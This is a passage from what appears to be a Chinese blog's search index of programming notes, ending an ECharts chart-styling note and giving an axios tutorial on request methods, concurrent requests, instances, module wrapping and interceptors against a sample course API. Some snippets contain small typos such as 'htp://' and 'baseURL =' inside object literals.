//半径模式 / 面积模式</code></p><h5 id="图形的文字-和-线">图形的文字 和 线<a title="#图形的文字-和-线" href="#图形的文字-和-线"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">series</span>:[ </span><br><span class="line">    &#123; </span><br><span class="line">    <span class="attr">label</span>:&#123;</span><br><span class="line">          <span class="attr">fontSize</span>:<span class="number">10</span>  </span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">labelLine</span>:&#123;</span><br><span class="line">        <span class="attr">length</span>:<span class="number">50</span> <span class="comment">//链接图形的线</span></span><br><span class="line">        <span class="attr">length2</span>:<span class="number">10</span>  <span class="comment">//链接文字的线条</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125; </span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="1.6-echart社区">1.6 EChart社区<a title="#1.6-echart社区" href="#1.6-echart社区"></a></h3><h3 id="1.7-地图">1.7 地图<a title="#1.7-地图" href="#1.7-地图"></a></h3><p>先引入地图js</p><h5 id="改变鼠标悬停后的颜色">改变鼠标悬停后的颜色<a title="#改变鼠标悬停后的颜色" href="#改变鼠标悬停后的颜色"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">geo</span>:&#123;</span><br><span class="line">    <span class="attr">normal</span>:&#123;</span><br><span class="line">        <span class="attr">areaColor</span>:<span class="string">&quot;pink&quot;</span>,</span><br><span class="line">        <span class="attr">borderColor</span>:<span class="string">&quot;...&quot;</span></span><br><span class="line">        <span class="attr">borderWidth</span>:<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="改变大小">改变大小<a title="#改变大小" href="#改变大小"></a></h5><p><code>geo:&#123; zoom: 1.2 &#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js组件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10 axios</title>
      <link href="/learningNotes/vue/10%20axios"/>
      <url>/learningNotes/vue/10%20axios</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="1.axios功能特点">1.axios功能特点<a title="#1.axios功能特点" href="#1.axios功能特点"></a></h2><ul><li>在浏览器中发送XMLHttpRequests请求</li><li>在node.js中发送http请求</li><li>支持Promise API</li><li>拦截请求和响应</li><li>转换请求和响应数据</li></ul><h2 id="2.axios请求方式">2.axios请求方式<a title="#2.axios请求方式" href="#2.axios请求方式"></a></h2><ul><li><code>axios(config)</code> 默认get请求</li><li><code>axios.request(config)</code></li><li><code>axios.get(url[,config])</code></li><li><code>axios.delete(url[,config])</code></li><li><code>axios.head(url[,config])</code></li><li><code>axios.post(url[,data[,config]])</code></li><li><code>axios.put(url[,data[,config]])</code></li><li><code>axios.patch(url[,data[,config]])</code></li></ul><h2 id="3.axios框架的基本使用">3.axios框架的基本使用<a title="#3.axios框架的基本使用" href="#3.axios框架的基本使用"></a></h2><p>接口：<a href="http://123.207.32.32:8000/home/multidata">http://123.207.32.32:8000/home/multidata</a></p><p>axios默认是get方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//get请求</span></span><br><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;http://123.207.32.32:8000/home/multidata&quot;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//带参数</span></span><br><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;http://123.207.32.32:8000/home/data?type=pop&amp;page=1&quot;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//get请求的参数拼接</span></span><br><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;http://123.207.32.32:8000/home/data&quot;</span>,</span><br><span class="line">    <span class="attr">params</span>:&#123;</span><br><span class="line">        <span class="attr">type</span>:<span class="string">&#x27;pop&#x27;</span>,</span><br><span class="line">        <span class="attr">page</span>:<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="2.axios发送并发请求">2.axios发送并发请求<a title="#2.axios发送并发请求" href="#2.axios发送并发请求"></a></h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">axios.<span class="title function_">all</span>([<span class="title function_">axios</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;http://123.207.32.32:8000/home/multidata&quot;</span></span><br><span class="line">    &#125;), <span class="title function_">axios</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;http://123.207.32.32:8000/home/data&quot;</span>,</span><br><span class="line">        <span class="attr">params</span>: &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;pop&#x27;</span>,</span><br><span class="line">            <span class="attr">page</span>: <span class="number">2</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)])</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">results</span> =&gt;</span> &#123;</span><br><span class="line">         <span class="variable language_">console</span>.<span class="title function_">log</span>(results);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用axios.spread可将数组[res1,res2]展开</span></span><br><span class="line">axios.<span class="title function_">all</span>([<span class="title function_">axios</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;http://123.207.32.32:8000/home/multidata&quot;</span></span><br><span class="line">    &#125;), <span class="title function_">axios</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;http://123.207.32.32:8000/home/data&quot;</span>,</span><br><span class="line">        <span class="attr">params</span>: &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;pop&#x27;</span>,</span><br><span class="line">            <span class="attr">page</span>: <span class="number">2</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)])</span><br><span class="line">    .<span class="title function_">then</span>(axios.<span class="title function_">spread</span>(<span class="function">(<span class="params">res1, res2</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res1);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res2);</span><br><span class="line">    &#125;))</span><br></pre></td></tr></table></figure><h2 id="3.全局配置">3.全局配置<a title="#3.全局配置" href="#3.全局配置"></a></h2><p>因为BaseURL是固定的，可以抽取/利用axios的全局配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3.全局配置 </span></span><br><span class="line"><span class="comment">//超时 ms</span></span><br><span class="line">axios.<span class="property">defaults</span>.<span class="property">baseURL</span> = <span class="string">&quot;http://123.207.32.32:8000&quot;</span></span><br><span class="line">axios.<span class="property">defaults</span>.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//get请求</span></span><br><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;/home/multidata&quot;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// console.log(res);</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="3.2常见的配置选项">3.2常见的配置选项<a title="#3.2常见的配置选项" href="#3.2常见的配置选项"></a></h3><p>如果是put  params</p><p>如果是post data</p><img src='https://s1.328888.xyz/2022/04/09/XaK8e.jpg'><h2 id="4.axios实例和模块封装">4.axios实例和模块封装<a title="#4.axios实例和模块封装" href="#4.axios实例和模块封装"></a></h2><h3 id="4.1如果有多个请求接口时-使用实例会比较好">4.1如果有多个请求接口时 使用实例会比较好<a title="#4.1如果有多个请求接口时-使用实例会比较好" href="#4.1如果有多个请求接口时-使用实例会比较好"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.js</span></span><br><span class="line"><span class="comment">// 4.创建对应的实例</span></span><br><span class="line"><span class="keyword">const</span> instance1 = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">    baseURL = <span class="string">&quot;htp://123.207.32.32:8000&quot;</span>,</span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">5000</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="title function_">instance1</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;/home/multidata&quot;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="title function_">instance1</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;/home/data&quot;</span>,</span><br><span class="line">    <span class="attr">params</span>: &#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;pop&#x27;</span>,</span><br><span class="line">        <span class="attr">page</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> instance2 = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  baseURL = <span class="string">&quot;htp://123.207.33.11:8000&quot;</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">5000</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4.2-模块封装">4.2 模块封装<a title="#4.2-模块封装" href="#4.2-模块封装"></a></h3><p>如果有个第三方的东西需要导入，不要每一个组件都导入这个第三方框架，这样每个页面对这个框架依赖性太强了，如果有一天这个第三方的东西不再维护了，所有页面都得换掉</p><p>所以尽量封装成一个文件，这样改的话就改一个文件的就可以了</p><h4 id="4.2.1.每个页面都导入的情况">4.2.1.每个页面都导入的情况<a title="#4.2.1.每个页面都导入的情况" href="#4.2.1.每个页面都导入的情况"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vue</span></span><br><span class="line">&lt;h2&gt;&#123;&#123; categories &#125;&#125;&lt;/h2&gt;</span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;HelloWorld&quot;</span>,</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">categories</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//生命周期函数  组件创建好后 发送请求</span></span><br><span class="line">    <span class="title function_">created</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">axios</span>(&#123;</span><br><span class="line">            <span class="attr">url</span>:<span class="string">&quot;http://123.207.32.32:8000/category&quot;</span></span><br><span class="line">        &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">categories</span> = res;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4.2.2-封装">4.2.2 封装<a title="#4.2.2-封装" href="#4.2.2-封装"></a></h4><h5 id="4.2.2.1-src建文件夹-network-建request.js">4.2.2.1 src建文件夹 network 建request.js<a title="#4.2.2.1-src建文件夹-network-建request.js" href="#4.2.2.1-src建文件夹-network-建request.js"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//request.js</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&quot;axios&quot;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">request</span>(<span class="params">config, success, failure</span>) &#123;</span><br><span class="line">    <span class="comment">// 1.创建axios的实例</span></span><br><span class="line">    <span class="keyword">const</span> instance = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">        <span class="attr">baseURL</span>: <span class="string">&quot;http://123.207.32.32:8000&quot;</span>,</span><br><span class="line">        <span class="attr">timeout</span>: <span class="number">5000</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送真正的网络请求</span></span><br><span class="line">    <span class="comment">// 通过两个函数 吧把结果回调出去</span></span><br><span class="line">    <span class="title function_">instance</span>(config).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">        <span class="title function_">success</span>(res)</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">        <span class="title function_">failure</span>(err)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//main.js</span></span><br><span class="line"><span class="comment">//5.封装reque模块</span></span><br><span class="line"><span class="keyword">import</span> &#123; request &#125; <span class="keyword">from</span> <span class="string">&#x27;./network/request&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">request</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;/home/multidata&#x27;</span></span><br><span class="line">&#125;, <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="4.2.2.2-另一种封装方法：">4.2.2.2 另一种封装方法：<a title="#4.2.2.2-另一种封装方法：" href="#4.2.2.2-另一种封装方法："></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//request.js</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&quot;axios&quot;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">request</span>(<span class="params">config</span>) &#123;</span><br><span class="line">    <span class="comment">// 1.创建axios的实例</span></span><br><span class="line">    <span class="keyword">const</span> instance = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">        <span class="attr">baseURL</span>: <span class="string">&quot;http://123.207.32.32:8000&quot;</span>,</span><br><span class="line">        <span class="attr">timeout</span>: <span class="number">5000</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">instance</span>(config.<span class="property">baseConfig</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        config.<span class="title function_">success</span>(res)</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        config.<span class="title function_">failure</span>(err)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//mian.js</span></span><br><span class="line"><span class="title function_">request</span>(&#123;</span><br><span class="line">    <span class="attr">baseConfig</span>:&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">res</span>)&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">failure</span>:<span class="keyword">function</span>(<span class="params">err</span>)&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="4.2.2.3-推荐使用promise">4.2.2.3 推荐使用promise<a title="#4.2.2.3-推荐使用promise" href="#4.2.2.3-推荐使用promise"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//request.js</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&quot;axios&quot;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">request</span>(<span class="params">config, success, failure</span>) &#123;</span><br><span class="line">    <span class="comment">// 1.创建axios的实例</span></span><br><span class="line">    <span class="keyword">const</span> instance = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">        <span class="attr">baseURL</span>: <span class="string">&quot;http://123.207.32.32:8000&quot;</span>,</span><br><span class="line">        <span class="attr">timeout</span>: <span class="number">5000</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">instance</span>(config).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">        <span class="title function_">success</span>(res)</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">        <span class="title function_">failure</span>(err)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//main.js</span></span><br><span class="line"><span class="title function_">request</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;/home/multidata&quot;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="4.2.2.4--最终使用-axios的实例的返回值就是promise">4.2.2.4  最终使用 axios的实例的返回值就是promise<a title="#4.2.2.4--最终使用-axios的实例的返回值就是promise" href="#4.2.2.4--最终使用-axios的实例的返回值就是promise"></a></h5><blockquote><p>因为instance可以直接使用.then .catch方法</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//request.js</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&quot;axios&quot;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">request</span>(<span class="params">config</span>) &#123;</span><br><span class="line">        <span class="comment">// 1.创建axios的实例</span></span><br><span class="line">        <span class="keyword">const</span> instance = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">            <span class="attr">baseURL</span>: <span class="string">&quot;http://123.207.32.32:8000&quot;</span>,</span><br><span class="line">            <span class="attr">timeout</span>: <span class="number">5000</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">//发送真正的网络请求</span></span><br><span class="line">       <span class="keyword">return</span> <span class="title function_">instance</span>(config)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//main.js</span></span><br><span class="line"><span class="title function_">request</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;/home/multidata&quot;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>如果到时候axios不能用了，只需要改4-10行的代码就可以 了</p></blockquote><h2 id="5.axios拦截器">5.axios拦截器<a title="#5.axios拦截器" href="#5.axios拦截器"></a></h2><p>四种拦截器：请求成功/失败 、响应成功/失败：服务器没有具体是数据过来，传了错误码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">request</span>(<span class="params">config</span>) &#123;</span><br><span class="line">    <span class="comment">// 1.创建axios的实例</span></span><br><span class="line">    <span class="keyword">const</span> instance = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">        <span class="attr">baseURL</span>: <span class="string">&quot;http://123.207.32.32:8000&quot;</span>,</span><br><span class="line">        <span class="attr">timeout</span>: <span class="number">5000</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.axios的拦截器</span></span><br><span class="line">    <span class="comment">// 全局 axios.interceptors</span></span><br><span class="line">    <span class="comment">// 实例 instance.interceptors</span></span><br><span class="line">    <span class="comment">// 请求拦截</span></span><br><span class="line">    instance.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(<span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(config); <span class="comment">//拦截下来的是配置 拦截了配置还得给返回回去 不然就会请求失败</span></span><br><span class="line">        <span class="comment">// 1.可以通过拦截的形式给config中的一些信息不符合服务器要求 设置header什么的</span></span><br><span class="line">        <span class="comment">// 2.可能在请求时 show 加载中的图标</span></span><br><span class="line">        <span class="comment">// 3.某些网络请求 是必须携带一些信息 例如登录 带token</span></span><br><span class="line">        <span class="keyword">return</span> config;</span><br><span class="line">    &#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 响应拦截</span></span><br><span class="line">    instance.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">//因为一般用的时候只用data就可以了</span></span><br><span class="line">        <span class="comment">// 拦截了结果得返回出去 不然main.js log.res时undefined</span></span><br><span class="line">        <span class="comment">// console.log(res);</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="property">data</span>;</span><br><span class="line"></span><br><span class="line">    &#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.发送真正的网络请求</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">instance</span>(config)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
